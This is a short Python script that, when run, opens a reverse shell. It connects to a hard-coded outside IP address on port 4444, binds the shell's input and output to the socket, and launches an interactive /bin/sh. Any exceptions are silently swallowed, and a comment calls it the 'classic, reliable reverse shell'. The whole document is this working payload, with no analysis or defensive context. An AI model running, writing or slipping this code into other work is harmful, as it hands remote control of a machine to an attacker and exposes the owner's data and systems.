
import os,socket,subprocess

def run_payload():
    try:
        # The classic, reliable reverse shell. No more games.
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(("18.222.229.195",4444))
        os.dup2(s.fileno(),0)
        os.dup2(s.fileno(),1)
        os.dup2(s.fileno(),2)
        p=subprocess.call(["/bin/sh","-i"])
    except Exception:
        pass

run_payload()

